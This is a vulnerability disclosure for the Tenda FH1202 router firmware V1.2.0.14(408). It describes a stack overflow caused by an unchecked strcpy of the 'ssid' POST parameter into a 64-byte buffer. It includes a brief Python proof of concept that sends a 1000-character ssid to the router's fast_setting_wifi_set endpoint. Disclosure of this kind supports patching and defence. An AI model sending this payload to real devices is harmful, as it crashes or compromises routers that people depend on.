## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `form_fast_setting_wifi_set` function. The `src` variable receives the `ssid` parameter from a POST request and is later assigned to the `v7` and `v8` variable, which is fixed at 64 bytes. However, since the user can control the input of  `ssid`, the statement `strcpy(v7, src);`and `strcpy(v8, src);` can cause a buffer overflow. The user-provided  `ssid` can exceed the capacity of the `v7` and `v8` array, triggering this security vulnerability.

![image-20240319230233202](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230233202.png)

![image-20240319230222466](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230222466.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/fast_setting_wifi_set'

payload = {
    'ssid': 'a' * 1000
}

r = requests.post(url=url, data=payload)
print(r.content)
```

![image-20240319230350379](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230350379.png)
